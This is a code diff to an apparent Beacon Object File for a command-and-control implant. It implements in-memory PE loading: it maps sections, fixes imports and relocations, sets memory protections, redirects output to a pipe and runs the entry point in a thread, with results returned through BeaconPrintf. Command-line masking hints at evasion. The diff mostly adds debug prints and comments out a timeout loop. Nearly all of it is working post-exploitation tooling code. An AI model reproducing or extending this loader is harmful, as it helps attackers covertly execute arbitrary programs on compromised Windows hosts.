@@ -3,6 +3,8 @@
 
 #define DEFAULT_BUFF_SIZE 0x2000
 
+#define _WAIT_TIMEOUT 5000
+
 struct _PE_DATA {
     HANDLE ThreadHandle;
     BOOL   Masked;
@@ -16,6 +18,26 @@ struct _PE_DATA {
     PVOID  EntryPtr;
 };
 typedef _PE_DATA PE_DATA;
+
+#define LOG_LEVEL_INFO    0
+#define LOG_LEVEL_WARNING 1
+#define LOG_LEVEL_ERROR   2
+
+void LogMessage(int level, const char* format, ...) {
+    const char* prefixes[] = {"[INFO] ", "[WARN] ", "[ERROR]"};
+    char buffer[1024];
+    
+    va_list args;
+    va_start(args, format);
+    vsprintf_s(buffer, sizeof(buffer), format, args);
+    va_end(args);
+    
+    DbgPrint("%s%s\n", prefixes[level], buffer);
+    
+    if (level == LOG_LEVEL_ERROR) {
+        // Talvez adicionar ação adicional para erros
+    }
+}
 
 auto Fix::Tls( PVOID Base, PVOID DataDir ) -> VOID {
     if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
@@ -160,6 +182,14 @@ auto MaskCommandLine(VOID) -> VOID {
     }
 }
 
+// struct {
+//     PVOID Ptr;
+//     CHAR* Name;
+// } KeyList[10] = {
+//     .Name = 
+// };
+
+
 EXTERN_C
 auto go( CHAR* Args, INT32 Argc ) -> VOID {
     Data Parser = { 0 };
@@ -175,6 +205,14 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     INT32 TimeOut   = BeaconDataInt( &Parser );
     INT8  AllocMtd  = BeaconDataInt( &Parser );
     INT8  WriteMtd  = BeaconDataInt( &Parser );
+
+    DbgPrint("Buffer %p %d\n", Buffer, Length);
+    DbgPrint("args %s\n", Arguments);
+    DbgPrint("exp fnc %s\n", ExportFnc);
+    DbgPrint("pe key %s\n", PeKey);
+    DbgPrint("timeout %s\n", TimeOut);
+    DbgPrint("alloc mtd %d\n", AllocMtd);
+    DbgPrint("write mtd %d\n", WriteMtd);
 
     UPTR   Entry     = 0;
     ULONG  ThreadID  = 0;
@@ -221,18 +259,26 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     ImgSize = Header->OptionalHeader.SizeOfImage;
     IsDLL   = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;
 
-    if ( AllocMtd == Alloc::Default ) {
+    // if ( PeKey ) {
+    //     BeaconAddValue(  )
+    // }
+
+    // if ( AllocMtd == Alloc::Type::Default ) {
         ImgBase = VirtualAlloc( nullptr, ImgSize, MEM_COMMIT, PAGE_READWRITE );
-    } else if ( AllocMtd == Alloc::Drip ) {
+    // } else if ( AllocMtd == Alloc::Type::Drip ) {
         // ImgBase = BeaconDripAlloc
-    }
+    // }
     
     if ( ! ImgBase ) {
         return;
     }
 
+    DbgPrint("memory allocated %p\n", ImgBase);
+
     Entry = ( U_PTR( ImgBase ) + Header->OptionalHeader.AddressOfEntryPoint );
     Delta = ( U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase );
+
+    DbgPrint("entry %p\n", Entry);
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         Mem::Copy<PVOID>(
@@ -242,12 +288,32 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         );
     }
 
-    Fix::Imp( ImgBase, ImpDir );
-    Fix::Rel( ImgBase, Delta, RelDir );
-    Fix::Exp( ImgBase, ExpDir );
+    DbgPrint("copied\n");
+
+    if ( ImpDir->VirtualAddress ) {
+        DbgPrint("exist\n");
+        Fix::Imp( ImgBase, ImpDir );
+    }
+    
+    DbgPrint("outra copisaq\n");
+
+    if ( RelDir->VirtualAddress ) {
+        DbgPrint("exist\n");
+        Fix::Rel( ImgBase, Delta, RelDir );
+    }
+    
+    DbgPrint("outra copisaq\n");
+
+
+    // if ( ExpDir->VirtualAddress ) {
+    //     DbgPrint("exist\n");
+    //     Fix::Exp( ImgBase, ExpDir );
+    // }
+
+    DbgPrint("outra copisaq\n");
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
-        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
+        PVOID    SectionPtr       = PTR( U_PTR( ImgBase ) + SecHdr[i].VirtualAddress );
         SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;
         ULONG    MemoryProtection = 0;
         ULONG    OldProtection    = 0;
@@ -273,7 +339,7 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
 		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
 			MemoryProtection = PAGE_EXECUTE_READWRITE;
 
-        if ( ! ( VirtualProtect( SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return; }
+        VirtualProtect( SectionPtr, SectionSize, MemoryProtection, &OldProtection );
     }
 
     if ( ! ( WinHandle = GetConsoleWindow() ) ) {
@@ -283,70 +349,107 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         }
     }
 
-    freopen_s( &fOut, "CONOUT$", "r+", stdout );
-    freopen_s( &fErr, "CONOUT$", "r+", stderr );
+    DbgPrint("seting stdin stdout\n");
+
+    // freopen_s( &fOut, "CONOUT$", "r+", stdout );
+    // freopen_s( &fErr, "CONOUT$", "r+", stderr );
 
     SecAttr = { sizeof( SecAttr ), nullptr, TRUE };
-    CreatePipe( &PipeRead, &PipeWrite, &SecAttr, 0 );
+    CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );
+    // ULONG Mode = PIPE_NOWAIT;
+    // SetNamedPipeHandleState( PipeRead, &Mode, NULL, NULL );
 
+    BackupOut = GetStdHandle( STD_OUTPUT_HANDLE );
     SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
     SetStdHandle( STD_ERROR_HANDLE, PipeWrite );
 
-    fO = _open_osfhandle( (intptr_t)PipeWrite, _O_TEXT );
+    // fOut = _fdopen(_open_osfhandle((intptr_t)PipeWrite, _O_TEXT), "w");
+    // fErr = _fdopen(_open_osfhandle((intptr_t)PipeWrite, _O_TEXT), "w");
 
-    _dup2( fO, _fileno( fOut ) );
-    _dup2( fO, _fileno( fErr ) );
+    // fO = _open_osfhandle( (intptr_t)PipeWrite, _O_TEXT );
 
-    _dup2( fO, 1 );
-    _dup2( fO, 2 );
+    // _dup2( fO, _fileno( fOut ) );
+    // _dup2( fO, _fileno( fErr ) );
+
+    // _dup2( fO, 1 );
+    // _dup2( fO, 2 );
 
     QueryPerformanceFrequency( &Frequency );
     QueryPerformanceCounter( &Before );
 
-    hThread = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE )Entry, nullptr, 0, &ThreadID );
+    DbgPrint("creating thread\n");
+
+    hThread = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)Entry, nullptr, 0, &ThreadID );
 
     OutBuffer = Mem::Alloc<BYTE*>( DEFAULT_BUFF_SIZE );
 
-    do {
-        QueryPerformanceCounter( &After );
+    DbgPrint("buffer mem allocated\n");
 
-        if ( ( ( After.QuadPart - Before.QuadPart ) / Frequency.QuadPart ) > TimeOut ) {
-            TerminateThread( hThread, WAIT_TIMEOUT );
-            Success = FALSE;
-        }
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle( PipeWrite );
+    CloseHandle(hThread);
 
-        WaitResult = WaitForSingleObject( hThread, WAIT_TIMEOUT );
-
-        switch ( WaitResult ) {
-            case WAIT_ABANDONED:
-                break;
-            case WAIT_FAILED:
-                break;
-            case WAIT_TIMEOUT:
-                break;
-            case WAIT_OBJECT_0:
-                IsDone = TRUE; break;
-        }
-
-        PeekNamedPipe( 0, nullptr, 0, nullptr, &AvailBts, nullptr );
-
-        if ( AvailBts ) {
-            Mem::Set<BYTE*>( OutBuffer, 0, DEFAULT_BUFF_SIZE );
-            ReadFile( 0, OutBuffer, DEFAULT_BUFF_SIZE - 1, &OutLength, nullptr );
-
-            BeaconPrintf( CALLBACK_OUTPUT, "%s", OutBuffer );
-        }
-    } while ( ! IsDone || ! AvailBts );
-
-    if (Success) {
-        ExecTime.QuadPart = After.QuadPart - Before.QuadPart;
-        
-        double seconds = (double)ExecTime.QuadPart / (double)Frequency.QuadPart;
-        
-        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[+] PE execution completed in %.3f seconds\n", seconds);
+    if ( ReadFile( PipeRead, OutBuffer, DEFAULT_BUFF_SIZE, Reads, 0 ) && *Reads ) {
+        DbgPrint("[%d]\n", *Reads);
+        DbgPrint("[%d] %s\n", *Reads, OutBuffer);
+        BeaconPrintf( CALLBACK_OUTPUT, "%s", OutBuffer );
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n\n[x] Failed to read all output of PE\n");
+        DbgPrint("failed: %d", GetLastError());
     }
+    
+
+    // do {
+    //     QueryPerformanceCounter( &After );
+
+    //     if ( ( ( After.QuadPart - Before.QuadPart ) / Frequency.QuadPart ) > TimeOut ) {
+    //         TerminateThread( hThread, _WAIT_TIMEOUT );
+    //         DbgPrint("force end\n");
+    //         Success = FALSE;
+    //     }
+
+    //     DbgPrint("wait thread end\n");
+
+    //     WaitResult = WaitForSingleObject( hThread, _WAIT_TIMEOUT );
+
+    //     switch ( WaitResult ) {
+    //         case WAIT_ABANDONED:
+    //             break;
+    //         case WAIT_FAILED:
+    //             break;
+    //         case WAIT_TIMEOUT:
+    //             break;
+    //         case WAIT_OBJECT_0:
+    //             IsDone = TRUE; break;
+    //     }
+
+    //     PeekNamedPipe( PipeRead, nullptr, 0, nullptr, &AvailBts, nullptr );
+
+    //     DbgPrint("bytes aval %d\n", AvailBts);
+
+    //     if ( AvailBts ) {
+    //         Mem::Set<BYTE*>( OutBuffer, 0, DEFAULT_BUFF_SIZE );
+    //         ReadFile( PipeRead, OutBuffer, DEFAULT_BUFF_SIZE-1, &OutLength, nullptr );
+
+    //         BeaconPrintf( CALLBACK_OUTPUT, "%s", OutBuffer );
+    //         DbgPrint("send out\n");
+    //     }
+    // } while ( ! IsDone || AvailBts );
+
+    // if ( Success ) {
+    //     ExecTime.QuadPart = After.QuadPart - Before.QuadPart;
+        
+    //     double seconds = (double)ExecTime.QuadPart / (double)Frequency.QuadPart;
+        
+    //     BeaconPrintf(CALLBACK_OUTPUT, "\n\n[+] PE execution completed in %.3f seconds\n", seconds);
+    // } else {
+    //     BeaconPrintf(CALLBACK_OUTPUT, "\n\n[x] Failed to read all output of PE\n");
+    // }
+
+    if ( BackupOut ) SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
+    // if (PipeRead  != INVALID_HANDLE_VALUE ) CloseHandle( PipeRead );
+    // if (PipeWrite != INVALID_HANDLE_VALUE ) CloseHandle( PipeWrite );
+    // if (fOut) fclose( fOut );
+    // if (fErr) fclose( fErr );
 
     return;
 }
